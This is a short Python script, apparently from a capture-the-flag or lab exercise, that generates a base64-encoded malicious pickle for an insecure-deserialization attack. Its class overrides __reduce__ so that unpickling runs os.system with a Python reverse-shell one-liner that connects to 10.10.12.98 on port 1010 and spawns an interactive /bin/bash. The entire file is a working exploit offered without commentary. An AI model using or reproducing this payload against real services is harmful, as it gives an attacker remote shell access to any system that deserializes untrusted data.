import pickle
import os
import base64

class Aula(object):

    def __reduce__(self):
        return (os.system,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.12.98\",1010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",))

objeto = base64.b64encode(pickle.dumps(Aula()))
print(objeto)
